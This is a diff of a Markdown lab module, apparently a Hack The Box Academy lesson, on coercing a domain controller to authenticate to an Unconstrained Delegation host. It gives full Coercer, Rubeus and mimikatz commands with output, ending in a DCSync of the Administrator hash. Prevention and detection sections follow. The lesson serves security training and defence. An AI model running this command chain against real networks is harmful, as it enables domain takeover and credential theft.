@@ -1,24 +1,25 @@
+# Coercing Attacks & Unconstrained Delegation
 
-## Description
+### Description
 
-Coercing attacks have become a `one-stop shop` for escalating privileges from any user to Domain Administrator. Nearly every organization with a default AD infrastructure is vulnerable. We've just tasted coercing attacks when we discussed the `PrinterBug`. However, several other RPC functions can perform the same functionality. Therefore, any domain user can coerce `RemoteServer$` to authenticate to any machine in the domain. Eventually, the [Coercer](https://github.com/p0dalirius/Coercer) tool was developed to exploit all known vulnerable RPC functions simultaneously.
+Coercing attacks have become a `one-stop shop` for escalating privileges from any user to Domain Administrator. Nearly every organization with a default AD infrastructure is vulnerable. We've just tasted coercing attacks when we discussed the `PrinterBug`. However, several other RPC functions can perform the same functionality. Therefore, any domain user can coerce `RemoteServer$` to authenticate to any machine in the domain. Eventually, the [Coercer](https://github.com/p0dalirius/Coercer) tool was developed to exploit all known vulnerable RPC functions simultaneously.
 
-Similar to the `PrinterBug`, an attacker can choose from several "follow up" options with the reverse connection, which, as mentioned before, are:
+Similar to the `PrinterBug`, an attacker can choose from several "follow up" options with the reverse connection, which, as mentioned before, are:
 
-1. Relay the connection to another DC and perform DCSync (if `SMB Signing` is disabled).
-2. Force the Domain Controller to connect to a machine configured for `Unconstrained Delegation` (`UD`) - this will cache the TGT in the memory of the UD server, which can be captured/exported with tools like `Rubeus` and `Mimikatz`.
-3. Relay the connection to `Active Directory Certificate Services` to obtain a certificate for the Domain Controller. Threat agents can then use the certificate on-demand to authenticate and pretend to be the Domain Controller (e.g., DCSync).
+1. Relay the connection to another DC and perform DCSync (if `SMB Signing` is disabled).
+2. Force the Domain Controller to connect to a machine configured for `Unconstrained Delegation` (`UD`) - this will cache the TGT in the memory of the UD server, which can be captured/exported with tools like `Rubeus` and `Mimikatz`.
+3. Relay the connection to `Active Directory Certificate Services` to obtain a certificate for the Domain Controller. Threat agents can then use the certificate on-demand to authenticate and pretend to be the Domain Controller (e.g., DCSync).
 4. Relay the connection to configure Resource-Based Kerberos Delegation for the relayed machine. We can then abuse the delegation to authenticate as any Administrator to that machine.
 
----
+***
 
-## Attack
+### Attack
 
-We will abuse the second "follow-up", assuming that an attacker has gained administrative rights on a server configured for `Unconstrained Delegation`. We will use this server to capture the TGT, while `Coercer` will be executed from the Kali machine.
+We will abuse the second "follow-up", assuming that an attacker has gained administrative rights on a server configured for `Unconstrained Delegation`. We will use this server to capture the TGT, while `Coercer` will be executed from the Kali machine.
 
-To identify systems configured for `Unconstrained Delegation`, we can use the `Get-NetComputer` function from [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) along with the `-Unconstrained` switch:
+To identify systems configured for `Unconstrained Delegation`, we can use the `Get-NetComputer` function from [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) along with the `-Unconstrained` switch:
 
-  Coercing Attacks & Unconstrained Delegation
+&#x20; Coercing Attacks & Unconstrained Delegation
 
 ```powershell-session
 PS C:\Users\bob\Downloads> Get-NetComputer -Unconstrained | select samaccountname
@@ -33,9 +34,9 @@ DC2$
 
 ![Find Unconstrained Delegation](https://academy.hackthebox.com/storage/modules/176/A11/GetNetComputer.png)
 
-`WS001` and `SERVER01` are trusted for Unconstrained delegation (Domain Controllers are trusted by default). So either WS001 or Server01 would be a target for an adversary. In our scenario, we have already compromised WS001 and 'Bob', who has administrative rights on this host. We will start `Rubeus` in an administrative prompt to monitor for new logons and extract TGTs:
+`WS001` and `SERVER01` are trusted for Unconstrained delegation (Domain Controllers are trusted by default). So either WS001 or Server01 would be a target for an adversary. In our scenario, we have already compromised WS001 and 'Bob', who has administrative rights on this host. We will start `Rubeus` in an administrative prompt to monitor for new logons and extract TGTs:
 
-  Coercing Attacks & Unconstrained Delegation
+&#x20; Coercing Attacks & Unconstrained Delegation
 
 ```powershell-session
 PS C:\Users\bob\Downloads> .\Rubeus.exe monitor /interval:1
@@ -75,9 +76,9 @@ lHsBolieGSyY20ZHBYjXflCGkO13mRwqO3rQ5KMs8HrC3Aqu7Popaw29at0vzZLinYnWnHUn01hh5e3Q
 
 ![Rubeus Monitor TGTs](https://academy.hackthebox.com/storage/modules/176/A11/RubeusMonitor.png)
 
-Next, we need to know the IP address of WS001, which we can be obtain by running `ipconfig`. Once known, we will switch to the Kali machine to execute `Coercer` towards DC1, while we force it to connect to WS001 if coercing is successful:
+Next, we need to know the IP address of WS001, which we can be obtain by running `ipconfig`. Once known, we will switch to the Kali machine to execute `Coercer` towards DC1, while we force it to connect to WS001 if coercing is successful:
 
-  Coercing Attacks & Unconstrained Delegation
+&#x20; Coercing Attacks & Unconstrained Delegation
 
 ```shell-session
 LeDaav@htb[/htb]$ Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
@@ -107,9 +108,9 @@ LeDaav@htb[/htb]$ Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local
 
 ![Coercer to DC1](https://academy.hackthebox.com/storage/modules/176/A11/Coercer.png)
 
-Now, if we switch to WS001 and look at the continuous output that `Rubeus` provide, there should be a TGT for DC1 available:
+Now, if we switch to WS001 and look at the continuous output that `Rubeus` provide, there should be a TGT for DC1 available:
 
-  Coercing Attacks & Unconstrained Delegation
+&#x20; Coercing Attacks & Unconstrained Delegation
 
 ```powershell-session
 [*] 18/12/2022 22.55.52 UTC - Found new TGT:
@@ -143,7 +144,7 @@ We can use this TGT for authentication within the domain, becoming the Domain Co
 
 One way of using the abovementioned TGT is through Rubeus, as follows.
 
-  Coercing Attacks & Unconstrained Delegation
+&#x20; Coercing Attacks & Unconstrained Delegation
 
 ```powershell-session
 PS C:\Users\bob\Downloads> .\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...
@@ -180,7 +181,7 @@ Cached Tickets: (1)
 
 Then, a DCSync attack can be executed through mimikatz, essentially by replicating what we did in the DCSync section.
 
-  Coercing Attacks & Unconstrained Delegation
+&#x20; Coercing Attacks & Unconstrained Delegation
 
 ```powershell-session
 PS C:\Users\bob\Downloads\mimikatz_trunk\x64> .\mimikatz.exe "lsadump::dcsync /domain:eagle.local /user:Administrator"
@@ -239,22 +240,22 @@ mimikatz # exit
 Bye!
 ```
 
----
+***
 
-## Prevention
+### Prevention
 
 Windows does not offer granular visibility and control over RPC calls to allow discovering what is being used and block certain functions. Therefore, an out-of-the-box solution for preventing this attack does not exist currently. However, there are two different general approaches to preventing coercing attacks:
 
-1. Implementing a third-party RPC firewall, such as the one from [zero networks](https://github.com/zeronetworks/rpcfirewall), and using it to block dangerous RPC functions. This tool also comes up with an audit mode, allowing monitoring and gaining visibility on whether business disruptions may occur by using it or not. Moreover, it goes a step further by providing the functionality of blocking RPC functions if the dangerous `OPNUM` associated with coercing is present in the request. (Note that in this option, for every newly discovered RPC function in the future, we will have to modify the firewall's configuration file to include it.)
-2. Block Domain Controllers and other core infrastructure servers from connecting to outbound ports `139` and `445`, `except` to machines that are required for AD (as well for business operations). One example is that while we block general outbound traffic to ports 139 and 445, we still should allow it for cross Domain Controllers; otherwise, domain replication will fail. (The benefit of this solution is that it will also work against newly discovered vulnerable RPC functions or other coercing methods.)
+1. Implementing a third-party RPC firewall, such as the one from [zero networks](https://github.com/zeronetworks/rpcfirewall), and using it to block dangerous RPC functions. This tool also comes up with an audit mode, allowing monitoring and gaining visibility on whether business disruptions may occur by using it or not. Moreover, it goes a step further by providing the functionality of blocking RPC functions if the dangerous `OPNUM` associated with coercing is present in the request. (Note that in this option, for every newly discovered RPC function in the future, we will have to modify the firewall's configuration file to include it.)
+2. Block Domain Controllers and other core infrastructure servers from connecting to outbound ports `139` and `445`, `except` to machines that are required for AD (as well for business operations). One example is that while we block general outbound traffic to ports 139 and 445, we still should allow it for cross Domain Controllers; otherwise, domain replication will fail. (The benefit of this solution is that it will also work against newly discovered vulnerable RPC functions or other coercing methods.)
 
----
+***
 
-## Detection
+### Detection
 
-As mentioned, Windows does not provide an out-of-the-box solution for monitoring RPC activity. The RPC Firewall from [zero networks](https://github.com/zeronetworks/rpcfirewall) is an excellent method of detecting the abuse of these functions and can indicate immediate signs of compromise; however, if we follow the general recommendations to not install third-party software on Domain Controllers then firewall logs are our best chance.
+As mentioned, Windows does not provide an out-of-the-box solution for monitoring RPC activity. The RPC Firewall from [zero networks](https://github.com/zeronetworks/rpcfirewall) is an excellent method of detecting the abuse of these functions and can indicate immediate signs of compromise; however, if we follow the general recommendations to not install third-party software on Domain Controllers then firewall logs are our best chance.
 
-A successful coercing attack with Coercer will result in the following host firewall log, where the machine at `.128` is the attacker machine and the `.200` is the Domain Controller:
+A successful coercing attack with Coercer will result in the following host firewall log, where the machine at `.128` is the attacker machine and the `.200` is the Domain Controller:
 
 ![DC1 TGT](https://academy.hackthebox.com/storage/modules/176/A11/Coercer-FirewallLogs.png)
 
@@ -264,6 +265,6 @@ If we go forward and block outbound traffic to port 445, then we will observe th
 
 ![DC1 TGT](https://academy.hackthebox.com/storage/modules/176/A11/Coercer-FirewallLogsBlockOutbound139n445.png)
 
-Now we can see that even though the inbound connection is successful, the firewall drops the outbound one, and consequently, the attacker does not receive any coerced TGTs. Sometimes, when port 445 is blocked, the machine will attempt to connect to port 139 instead, so blocking both ports `139` and `445` is recommended.
+Now we can see that even though the inbound connection is successful, the firewall drops the outbound one, and consequently, the attacker does not receive any coerced TGTs. Sometimes, when port 445 is blocked, the machine will attempt to connect to port 139 instead, so blocking both ports `139` and `445` is recommended.
 
-The above can also be used for detection, as any unexpected dropped traffic to ports `139` or `445` is suspicious.
+The above can also be used for detection, as any unexpected dropped traffic to ports `139` or `445` is suspicious.
